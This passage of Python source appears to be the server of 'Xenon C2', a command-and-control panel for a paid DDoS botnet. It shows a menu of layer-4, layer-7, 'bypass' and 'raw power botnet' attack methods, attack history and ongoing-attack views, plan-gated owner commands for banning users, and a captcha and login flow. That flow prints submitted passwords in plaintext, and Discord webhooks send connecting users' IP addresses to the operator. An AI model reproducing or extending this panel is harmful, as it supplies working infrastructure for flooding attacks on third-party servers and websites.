                webhook = DiscordWebhook(url=discordSuggestionLogHook)
                embed = DiscordEmbed(title='Xenon C2', description='Message from Xenon', color='03b2f8')
                embed.set_author(name='View Users IP on Checkhost.', url=f'https://check-host.net/ip-info?host={addr[0]}', icon_url='https://physicsworld.com/wp-content/uploads/2013/07/PW-2013-07-05-Commissariat-xenon-main.jpg')
                embed.set_footer(text='A Suggestion.')
                embed.set_timestamp()
                embed.add_embed_field(name='IP Address', value=f'{addr[0]}')
                embed.add_embed_field(name='C_Port', value=f'{addr[1]}')
                embed.add_embed_field(name='User', value=f'{username}')
                embed.add_embed_field(name='Plan', value=f'{MyPlan}')
                embed.add_embed_field(name='Suggested', value=f'{Suggestion}')
                webhook.add_embed(embed)
                response = webhook.execute() 
                #------------------- End of --------------------------------------------------
                MainPage(client, addr, username, password, f"                 Successfully suggested '{Suggestion}'")
        case "METHODS":
            MethodsPage = (
f'''                              ╔╦╗╔═╗╔╦╗╦ ╦╔═╗╔╦╗╔═╗\r
                              ║║║║╣  ║ ╠═╣║ ║ ║║╚═╗\r
                              ╩ ╩╚═╝ ╩ ╩ ╩╚═╝═╩╝╚═╝\r           
     ╔══╦═════════╦════════════════════════════════════╗\r
                ║01║● BYPASS ║ ● Protected server Bypass methods. ║\r
                ║02║● GAME   ║ ● Game server Bypass methods.      ║\r
                ║03║● LAYER7 ║ ● Website Bypass methods           ║\r
                ║04║● RAW    ║ ● Raw power botnet methods         ║\r
                ║05║● LAYER4 ║ ● Layer 4 methods                  ║\r
                ╠══╣═════════╦════════════════════════════════════╣\r
                ║06║● JOKER  ║ ● Joker API Methods                ║\r    
            ║07║● LEAKZ  ║ ● Leakz API Methods                ║\r
                ║08║● STORM  ║ ● Storm API Methods                ║\r
                ║09║● XENON  ║ ● Official XENON APi Methods       ║\r
                ║10║● XENON-X║ ● Xenon home holder                ║\r
                ╚════════════╩════════════════════════════════════╝\r''')
            MainPage(client, addr, username, password, MethodsPage)
        
        case "QUIT":
            usersOnline -= 1
            client.close()
        
        case "EXIT":
            usersOnline -= 1
            client.close
        
        case "LOGOUT":
            usersOnline -= 1
            client.close
        
        case "HISTORY":
            ThePlan          = CheckPlan(username)
            HistoryOfAttacks = ReadPrevious(ThePlan)
            MainPage(client, addr, username, password, HistoryOfAttacks)
            
        case "TESTFADE":
            testthis = (str("Relix IP address"))
            WhatWeSend = (GradientFunc.gradiant([38, 207, 139], [146, 209, 39], testthis))
            MainPage(client, addr, username, password, f"{WhatWeSend}{Default}{Default_BG}")
        
        case "USERREMOVE":
            Plan = CheckPlan(username)
            if Plan == "Owner":
                MainPage(client, addr, username, password, "         Successfully removed 1 user from CNC ( Number ) ")
            else:
                MainPage(client, addr, username, password, "         Sorry, but this command is only available for Owners. ")
            
        case "UNBAN":
            Plan = CheckPlan(username)
            if Plan == "Owner":
                str(client.recv(buffer_len).decode()).strip().replace("\r\n", "")
                UsernameToRemove = str(client.recv(buffer_len).decode()).strip().replace("\r\n", "")
                OurResponse = unban(UsernameToRemove)
                if OurResponse == "ST":
                    MainPage(client, addr, username, password, f"         Successfully unbanned {UsernameToRemove}")
                elif OurResponse == "User not found":
                    MainPage(client, addr, username, password, f"         The username was not found in the BANNED USERS directory.")
                else:
                    MainPage(client, addr, username, password, f"         Error")
            else:
                MainPage(client, addr, username, password, "        This command is only for owners. ")
        
        case "BAN":
            CheckPlann = CheckPlan(username)
            if CheckPlann == "Owner":
                str(client.recv(buffer_len).decode()).strip().replace("\r\n", "")
                client.send(" Username : ".encode())
                UserToBan = str(client.recv(buffer_len).decode()).strip().replace("\r\n", "")
                tryBan = ban(UserToBan)
                if tryBan == "Successfully banned the user":
                    MainPage(client, addr, username, password, f"    Successfully banned {UserToBan}")
                elif tryBan == "This user is already banned":
                    MainPage(client, addr, username, password, f"     The user {UserToBan} is already banned.")
                elif tryBan == "Couldn't convert SI -> S":
                    MainPage(client, addr, username, password, f"     Error  [906] Contact owners.")
                else:
                    MainPage(client, addr, username, password, f"     Error [231]")
            else:
                MainPage(client, addr, username, password, "        This command is only for owners. ")
        
        case "ONGOING":
            Plan = CheckPlan(username)
            if Plan == "Owner":
                MainPage(client, addr, username, password, Ongoing())
            else:
                MainPage(client, addr, username, password, "         You do not have permission to use this command. ")
            
        case "USERADD":
            Plan = CheckPlan(username)
            if Plan == "Owner":
                MainPage(client, addr, username, password, "        Successfully added 1 user to the CNC ( Number ) ")
            else:
                MainPage(client, addr, username, password, "         Sorry, but this command is only available for Owners. ")
        
        case "", None:
            MainPage(client, addr, username, password, f"         This is not a valid command. ")
    
#------------------ Handle connections to the server ----------
def hand_con(client, addr):
    global usersOnline
    global rgb1
    global rgb2
    global WeCanLogin2
    #while (True):

    client.send(f"{Clear}".encode())
    client.send(str(f"\033]0; Captcha prompt @ Xenon\007").encode())
    getCaptcha = GenCaptcha()
    LoLCaptcha = (f"● Captcha ({getCaptcha}) :")
    OurCaptcha = GradiantTool(LoLCaptcha)
    OurCaptcha = (f"{OurCaptcha}{Black_BG}")
    CatpchaTing = (f''' 








                        {OurCaptcha}''')
    LoLUsername = (f"● Username :")
    OurUsername = GradiantTool(LoLUsername)
    OurUsername = (f"{OurUsername}{Black_BG}")
    UsernameTing = (f''' 








                        {OurUsername}''')
    LoLPassword = (f"● Password :")
    OurPassword = GradiantTool(LoLPassword)
    OurPassword = (f"{OurPassword}{Black_BG}{Black}")
    PasswordTing = (f''' 








                        {OurPassword}''')
    client.send(CatpchaTing.encode())
    captcha = str(client.recv(buffer_len).decode()).strip().replace("\r\n", "")
    print (f" [X] Captcha is {getCaptcha} and given captcha was {captcha}  -  {addr[0]}:{addr[1]}")
    if captcha == getCaptcha:
        client.send(f"{Clear}".encode())

        client.send(str(f"\033]0; Login prompt.\007").encode())

        str(client.recv(buffer_len).decode()).strip().replace("\r\n", "")
        client.send(UsernameTing.encode())
        UsernameFromClient = str(client.recv(buffer_len).decode()).strip().replace("\r\n", "")

        client.send(f"{Clear}".encode())
        client.send(PasswordTing.encode())
        str(client.recv(buffer_len).decode()).strip().replace("\r\n", "")
        PasswordFromClient = str(client.recv(buffer_len).decode()).strip().replace("\r\n", "")
        

        client.send(f" Checking {UsernameFromClient}.... ".encode())
    
        print (f" [X] Recieved {UsernameFromClient} and {PasswordFromClient}")

        CanWeLogin = (CheckDB(UsernameFromClient, PasswordFromClient))
        checkBon = CheckBan(UsernameFromClient)
        
    
        if CanWeLogin == "True" and checkBon == "FALSE":
            WeCanLogin = True
            usersOnline += 1
            print (f" [X] {UsernameFromClient} has logged in Sucessfully.")
            MainPage(client, addr, UsernameFromClient, PasswordFromClient, f"                 {OurBanner}\r\n")
    
        elif CanWeLogin == "False":
            WeCanLogin = False
            client.send(f" {Default_BG}{Default}{Clear}{Red_BG}[X] Sorry {UsernameFromClient}, you cannot login to Xenon Security.{Default_BG}{Default}".encode())
            print (" FALSE ")
            time.sleep(5)
            client.close()

        elif CanWeLogin == "USERROR":
            client.send(f" {Default_BG}{Default}{Clear}{Red_BG}[X] The username '{UsernameFromClient}' was not found in our Database.{Default_BG}{Default}".encode())
            print (f" [X] UERROR from {addr[0]}:{addr[1]}. ")
            time.sleep(5)
            client.close()
        

        else:
            client.send(f" {Default_BG}{Default}{Clear}{Red_BG}{Light_Green}[X] If you see this, your account is either banned or this is an error [{White}{GenCaptcha()}{Light_Green}]".encode())
            time.sleep(5)
            client.close()
    else:
        client.send(f" {Default_BG}{Default}{Clear} {Red_BG}Captcha wrong.{Default}{Default_BG}".encode())
        time.sleep(1)
        client.close()



def listenXenon():
        while (True):
                client, address = sock.accept()
                try:
                        threading.Thread(target=hand_con, args=(client, address)).start()
                except ConnectionAbortedError:
                        print(f" [X] Connection lost from --> [{address[0]}:{str(address[1])}]")
                        m = open("[X] Logs\\[X] Disconnect-logs.xenon", "a+")
                        m.write(f" [NEW] - [{address[0]}:{address[1]}] ~> Prompt Disconnect. \n")
                        m.close()
                        #--------------------------- Start of hook -----------------------------------
                        webhook = DiscordWebhook(url=discordDisConnecttHook)
                        embed = DiscordEmbed(title='Xenon C2', description='Message from Xenon', color='03b2f8')
                        embed.set_author(name='View Users IP on Checkhost.', url=f'https://check-host.net/ip-info?host={address[0]}', icon_url='https://physicsworld.com/wp-content/uploads/2013/07/PW-2013-07-05-Commissariat-xenon-main.jpg')
                        embed.set_footer(text='A disconnection.')
                        embed.set_timestamp()
                        embed.add_embed_field(name='IP Address', value=f'{address[0]}')
                        embed.add_embed_field(name='C_Port', value=f'{address[1]}')
                        webhook.add_embed(embed)
                        response = webhook.execute() 
                        #------------------- End of --------------------------------------------------
                print("\n [X] New connection from --> [" + address[0] + ":" + str(address[1]) + "]")

                f = open("[X] Logs\\[X] Login-logs.xenon", "a+")
                f.write(f" [NEW] - [{address[0]}:{address[1]}] ~> Prompt login. \n")
                f.close()

                #------------------------ DISCORD EMBED PLUG -----------------------------------------
                webhook = DiscordWebhook(url=discordConnectHook)
                embed = DiscordEmbed(title='Xenon C2', description='Message from Xenon', color='03b2f8')
                embed.set_author(name='New Connection', url='https://github.com/xvsync', icon_url='https://physicsworld.com/wp-content/uploads/2013/07/PW-2013-07-05-Commissariat-xenon-main.jpg')
                embed.set_footer(text='A new connection.')
                embed.set_timestamp()
                embed.add_embed_field(name='IP Address', value=f'{address[0]}')
                embed.add_embed_field(name='C_Port', value=f'{address[1]}')
                webhook.add_embed(embed)
                response = webhook.execute()
                #------------------------- End Of -----------------------------------------------------

threading.Thread(target=listenXenon).start()
